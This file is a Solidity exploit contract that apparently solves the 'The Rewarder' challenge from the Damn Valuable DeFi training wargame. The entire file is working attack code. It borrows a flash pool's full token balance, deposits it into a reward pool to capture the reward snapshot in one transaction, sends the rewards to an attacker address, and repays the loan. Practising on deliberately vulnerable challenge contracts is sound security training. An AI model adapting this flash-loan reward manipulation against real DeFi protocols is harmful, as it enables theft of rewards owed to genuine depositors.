// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
import "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";

contract Exploit {
    DamnValuableToken public immutable dvt;
    FlashLoanerPool public immutable flashPool;
    TheRewarderPool public immutable rewarderPool;
    address internal attacker;

    constructor(
        address _dvt,
        address _flashPool,
        address _rewarderPool,
        address _attacker
    ) {
        dvt = DamnValuableToken(_dvt);
        flashPool = FlashLoanerPool(_flashPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        attacker = _attacker;
    }

    function attack() public {
        flashPool.flashLoan(dvt.balanceOf(address(flashPool)));
    }

    function _withdrawRewards() private {
        uint256 amountToWithdraw = rewarderPool.rewardToken().balanceOf(
            address(this)
        );
        rewarderPool.rewardToken().transfer(attacker, amountToWithdraw);
    }

    fallback() external {
        uint256 loanAmount = dvt.balanceOf(address(this));
        dvt.approve(address(rewarderPool), loanAmount);
        rewarderPool.deposit(loanAmount);
        _withdrawRewards();
        rewarderPool.withdraw(loanAmount);
        dvt.transfer(address(flashPool), loanAmount);
    }
}
